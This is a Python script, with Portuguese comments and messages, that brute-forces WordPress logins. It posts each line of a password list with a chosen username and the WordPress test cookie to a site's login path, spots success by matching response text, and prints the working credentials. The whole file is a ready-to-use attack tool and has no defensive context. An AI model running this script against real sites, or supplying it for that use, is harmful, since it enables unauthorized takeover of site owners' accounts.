import os
import time


# Variaveis globais
color_red="\033[31m"
color_green="\033[32m"
color_blue="\033[34m"
color_default="\033[00m"
color_yellow="\033[33m"

# Cookie padrão wordpress
wp_cookies = dict(wordpress_test_cookie="WP+Cookie+check")

# Password and Username lists
user_pass = list()

def template_logo():
    os.system('clear')
    print("==========================================================================================")
    print("=========================\tBrute-Force Wordpress Login\t==========================")
    print("==========================================================================================")

def template_mod(mod):
    os.system('clear')
    print("=========================================================================================")
    print(f"{color_red}Por favor, verifique se o modulo {mod} está instalado! {color_default}")
    print("=========================================================================================")

def template_error(msgerror):
    os.system('clear')
    print("=========================================================================================")
    print(msgerror)
    print("=========================================================================================")

try:
    import requests
    from requests.exceptions import ConnectionError, ConnectTimeout
except Exception as msg:
    template_mod('requests')
    exit(0)

try:
    import argparse
except Exception as msg:
    template_mod('argparse')
    exit(0)

os.system('clear')
template_logo()

# Argumentos
agrp = argparse.ArgumentParser(description='')
agrp.add_argument("--url", metavar='url', type=str, nargs='+')
agrp.add_argument("--names", metavar='names', type=str, nargs='+')
agrp.add_argument("--path-login", metavar='path_login', type=str, nargs='+')
agrp.add_argument("--pass-list", metavar='pass_list', type=str, nargs='?')
agrp.add_argument("--user-list", metavar='user_list', type=str, nargs='?')
agrp.add_argument("--user", metavar='user', type=str, nargs='?')
agrp.add_argument("--pass", metavar='pass', type=str, nargs='?')
agrp.add_argument("--message-error", metavar='message_error', type=str, nargs='+')

# Transformando argumentos
args_arguments = agrp.parse_args()

# Inicio da sessão
session = requests.session()

try:
    requests.get(f"{args_arguments.url[0]}").text
except ConnectionError as msg:
    print("=========================================================================================")
    template_error(f"{color_red}Erro: Não foi possível conectar ao host {args_arguments.url[0]}, pois parece estar inativo.{color_default}")
    print("=========================================================================================")
    exit(0)


# ...
d_data_requests = dict()
for nm in args_arguments.names[0].split("&"):
    d_data_requests[nm.split("=")[0]] = nm.split("=")[1]

try:
    with open(args_arguments.pass_list, 'r') as words:
        count_req = 0
        for wd_words in words.readlines():
            count_req += 1
            d_data_requests['log'] = args_arguments.user.strip()
            d_data_requests['pwd'] = wd_words.strip()

            request_send = session.post(f'{args_arguments.url[0]}/{args_arguments.path_login[0]}', data=d_data_requests, cookies=wp_cookies) # Realizando a requisição principal..

            if "posts" in request_send.text:
                print(f"{count_req} : [{time.strftime('%d/%m/%Y %H:%M:%S')}] The user {color_green}{d_data_requests['log']}{color_default} and password {color_green}{d_data_requests['pwd']}{color_default} is password correct...")
                user_pass.append((d_data_requests['log'], d_data_requests['pwd'])) # Save password in list
                continue

            if args_arguments.message_error[0] in request_send.text:
                print(f"{count_req} : [{time.strftime('%d/%m/%Y %H:%M:%S')}] The user {color_red}{d_data_requests['log']}{color_default} and password {color_red}{d_data_requests['pwd']}{color_default} is password incorrect...")
                continue

            elif request_send.status_code == 404 or request_send.status_code == "404":
                template_error(f"{color_red}!Ooops, não encontramos a página solicitada!{color_default}")
                break

            else:
                template_error(f"{color_red}Houve um problema ao tentar identificar seu texto na resposta de erro de login.\n{color_yellow}Dica: {color_blue}Procure por um texto mais claro na página de usuário ou senha incorretos.\nPode ser incluido tags HTML.!{color_default}")
                break

        words.close()

except Exception as msg:
    template_error(f"Não foi possível localizar a lista {args_arguments.pass_list}")
    print(msg)

for user, passwd in dict(user_pass).items():
    print("=========================================================================================")
    print(f"{color_blue}Localizado: {color_default}")
    print(f"\tUsuário: {color_green}{user} {color_default}Password: {color_green}{passwd}{color_default}")
    print("=========================================================================================")